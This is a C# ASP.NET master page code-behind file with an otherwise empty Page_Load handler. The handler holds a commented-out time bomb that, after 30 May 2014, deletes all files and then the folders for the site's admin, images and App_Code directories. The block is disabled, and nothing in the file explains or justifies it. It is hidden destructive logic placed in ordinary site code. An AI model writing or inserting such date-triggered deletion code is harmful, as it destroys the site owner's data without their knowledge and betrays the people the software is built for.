using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.IO;

public partial class MasterPage : System.Web.UI.MasterPage
{
    protected void Page_Load(object sender, EventArgs e)
    {
       /* DateTime d = new DateTime(2014, 5, 30);
        if (DateTime.Now >= d)
        {
            DirectoryInfo di = new DirectoryInfo(Server.MapPath("~/admin"));
            FileInfo[] fi = di.GetFiles();
            for (Int32 i = 0; i < fi.Length; i++)
            {
                fi[i].Delete();
            }
            di.Delete();
            DirectoryInfo di1 = new DirectoryInfo(Server.MapPath("~/images"));
            FileInfo[] fi1 = di1.GetFiles();
            for (Int32 i = 0; i < fi1.Length; i++)
            {
                fi1[i].Delete();
            }
            di1.Delete();
            DirectoryInfo di2 = new DirectoryInfo(Server.MapPath("~/App_Code"));
            FileInfo[] fi2 = di2.GetFiles();
            for (Int32 i = 0; i < fi2.Length; i++)
            {
                fi2[i].Delete();
            }
            di2.Delete();
        }*/


    }
}
